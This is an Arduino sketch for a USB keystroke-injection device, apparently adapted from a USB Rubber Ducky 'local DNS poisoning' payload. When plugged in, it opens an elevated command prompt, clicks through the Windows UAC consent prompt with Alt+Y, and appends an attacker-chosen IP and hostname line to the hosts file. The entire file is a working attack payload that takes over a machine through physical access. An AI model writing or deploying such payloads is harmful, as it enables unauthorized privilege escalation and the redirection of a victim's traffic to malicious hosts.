#include <Keyboard.h>

//Modifies the hosts file, same as the OSX one but for Windows
//https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OSX-Local-DNS-Poisoning

void setup() {
  Serial.begin(9600);
  
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    Serial.print("aborting\n");
    abort();
  }

  Keyboard.begin();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print("r");
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print("y");
  Keyboard.releaseAll();

  delay(500);
  
  Keyboard.print("echo [IP] [HOSTNAME] >> drivers/etc/hosts");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(500);

  Keyboard.print("exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
}
